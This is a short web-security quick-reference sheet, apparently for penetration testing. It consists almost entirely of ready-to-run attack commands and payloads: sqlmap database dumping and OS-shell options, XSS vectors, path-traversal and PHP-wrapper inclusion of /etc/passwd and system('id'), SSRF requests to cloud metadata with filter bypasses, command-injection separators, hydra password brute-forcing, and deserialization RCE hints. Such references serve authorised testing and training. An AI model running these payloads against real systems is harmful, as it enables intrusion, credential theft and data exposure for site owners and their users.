# Web Security — Quick Reference

## Reconnaissance
```bash
nmap -sV -sC -p 80,443,8080,8443 {target}
whatweb {url}                             # Technology detection
curl -I {url}                             # Response headers
```

## Directory/File Discovery
```bash
ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.zip,.sql,.conf
gobuster dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirsearch -u {url} -e php,html,txt,bak
```

## SQL Injection
```bash
# GET parameter
sqlmap -u "{url}?id=1" --batch --dbs
# POST data
sqlmap -u "{url}" --data="user=admin&pass=test" --batch --dbs
# Saved request (from Burp)
sqlmap -r request.txt --batch --dbs
# Advanced
sqlmap -u "{url}?id=1" --batch -D {db} -T {table} --dump
sqlmap -u "{url}?id=1" --batch --os-shell  # OS shell if stacked queries
```

## XSS
```bash
# Test vectors
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus="
javascript:alert(1)
```

## LFI / Path Traversal
```bash
curl "{url}?page=../../../etc/passwd"
curl "{url}?page=....//....//....//etc/passwd"  # Double encoding bypass
curl "{url}?page=php://filter/convert.base64-encode/resource=index.php"
curl "{url}?page=php://input" -d "<?php system('id'); ?>"
curl "{url}?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
```

## SSRF
```bash
# Internal services
{url}?url=http://127.0.0.1:{port}
{url}?url=http://localhost:{port}
# Cloud metadata
{url}?url=http://169.254.169.254/latest/meta-data/
# File read
{url}?url=file:///etc/passwd
# Bypass filters
{url}?url=http://0x7f000001/
{url}?url=http://2130706433/   # decimal IP
```

## Command Injection
```bash
; id
| id
$(id)
`id`
%0aid          # newline
{url}?cmd=127.0.0.1;id
{url}?cmd=127.0.0.1|id
```

## Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh
ffuf -u {url}/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 401
```

## Deserialization
- PHP: `O:4:"User":1:{s:4:"name";s:5:"admin";}` → look for unserialize()
- Java: `rO0AB` (base64) or `ac ed 00 05` (hex) → Java serialized object
- Python: `pickle.loads()` → RCE via __reduce__
- Node.js: `node-serialize` → `{"rce":"_$$ND_FUNC$$_function(){...}()"}`
